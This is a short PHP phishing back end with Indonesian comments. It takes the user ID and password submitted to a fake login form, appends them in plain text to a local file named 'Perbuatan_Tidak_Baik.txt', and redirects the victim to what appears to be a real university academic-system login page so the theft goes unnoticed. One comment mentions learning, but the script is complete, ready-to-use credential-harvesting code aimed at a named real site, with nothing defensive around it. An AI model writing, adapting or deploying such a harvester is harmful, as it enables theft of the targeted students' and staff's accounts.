<!DOCTYPE html>
<html lang="id"></html>
<?php
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));

// Ambil data dari form
$userid = $_POST['userid'];
$password = $_POST['password'];

// Simpan ke file
$file = fopen("Perbuatan_Tidak_Baik.txt", "a");
fwrite($file, $userid . " - " . $password . PHP_EOL);
fclose($file);

// Redirect ke situs asli (hati-hati jika tujuannya bukan untuk belajar!)
header("Location: https://sia.iainkediri.ac.id/siakad/gate/login");
exit;
?>
</html>